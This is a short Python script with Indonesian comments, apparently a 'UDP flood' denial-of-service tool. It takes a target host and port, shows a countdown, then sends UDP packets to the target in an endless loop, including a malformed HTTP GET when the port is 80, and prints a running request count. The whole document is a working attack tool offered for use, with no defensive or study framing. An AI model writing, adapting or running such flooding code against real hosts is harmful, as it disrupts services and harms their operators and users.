import socket
import time
import os
import sys
import optparse

count = 0

jancok = optparse.OptionParser()
jancok.add_option("--host", dest="host")
jancok.add_option("--port", dest="port")
opts , args = jancok.parse_args()
host = opts.host
port = opts.port

# warna text
class colors:
    PURPLE = '\033[95m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    BLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OLDGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    YELLOW = '\033[33m'

# cara pemakaian
class helps:
	def __init__(self):
		print("""
{} __  __  ____    ____           ___  ___                       __     
/\ \/\ \/\  _`\ /\  _`\       /'___\/\_ \                     /\ \    
\ \ \ \ \ \ \/\ \ \ \L\ \    /\ \__/\//\ \     ___     ___    \_\ \   
 \ \ \ \ \ \ \ \ \ \ ,__/    \ \ ,__\ \ \ \   / __`\  / __`\  /'_` \  
  \ \ \_\ \ \ \_\ \ \ \/      \ \ \_/  \_\ \_/\ \L\ \/\ \L\ \/\ \L\ \ 
   \ \_____\ \____/\ \_\       \ \_\   /\____\ \____/\ \____/\ \___,_\
               \/_____/\/___/  \/_/        \/_/   \/____/\/___/  \/___/  \/__,_ /
                                                                      
--host = Untuk memasukkan nama host
--port = Untuk memasukkan nomor port(80)
{}""".format(colors.PURPLE,colors.ENDC))


	def dos():
		global count,host,port
		# IPV4 dan UDP
		sock = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
		# mengubah dns menjadi ip server
		ip = socket.gethostbyname(host)
		print("{}IP = {} port = {}".format(colors.PURPLE , ip , port))
		time.sleep(1)
		print("Hitungan mundur dalam 3")
		time.sleep(1)
		print("Hitungan mundur dalam 2")
		time.sleep(1)
		print("Hitungan mundur dalam 1{}".format(colors.ENDC))
		time.sleep(1)
		os.system("clear")
		time.sleep(1)
		while(True):
			if port == "80":
				request = "GET / \nHTTP/1.1\n HOST: {}\n".format(host).encode()
				sock.sendto(request,(str(ip),int(port)))
				count += 1
				print("{}Melakukan request sebanyak {} kali{}".format(colors.PURPLE , count ,  colors.ENDC))
			else:
				request = "helloworldorldorldorlo".encode()
				sock.sendto(request,(str(ip),int(port)))
				count += 1
				print("{}Melakukan request sebanyak {} kali{}".format(colors.PURPLE , count ,  colors.ENDC))

if len(sys.argv) == 1:
	helps()
if port:
	helps.dos()
